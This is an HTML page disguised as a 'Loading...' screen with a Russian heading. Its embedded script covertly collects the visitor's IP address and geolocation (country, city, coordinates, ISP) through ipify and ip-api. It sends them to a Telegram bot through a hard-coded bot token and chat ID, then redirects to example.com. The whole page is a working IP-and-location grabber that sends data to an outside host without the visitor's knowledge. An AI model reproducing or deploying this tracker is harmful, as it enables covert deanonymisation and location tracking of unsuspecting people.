<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <h1>Загрузка...</h1>
    <script>
        var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
        var chat_id = "8212240529";

        function sendToTelegram(text) {
            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
            fetch(url).catch(function() {});
        }

        // Получаем IP через ipify (безопасный, работает везде)
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                var ip = data.ip;
                sendToTelegram("IP: " + ip);

                // Пробуем получить геоданные через ip-api (но уже через HTTPS)
                return fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org')
                    .then(r => r.json())
                    .then(geo => {
                        if (geo.status === "success") {
                            var text = "Геоданные:\n" +
                                       "Страна: " + (geo.country || '—') + "\n" +
                                       "Город: " + (geo.city || '—') + "\n" +
                                       "Координаты: " + (geo.lat || '—') + ", " + (geo.lon || '—') + "\n" +
                                       "Провайдер: " + (geo.isp || '—');
                            sendToTelegram(text);
                        }
                    })
                    .catch(function() {});
            })
            .catch(function() {
                sendToTelegram("Ошибка определения IP");
            });

        setTimeout(function() {
            window.location.href = "https://example.com";
        }, 3000);
    </script>
</body>
</html>
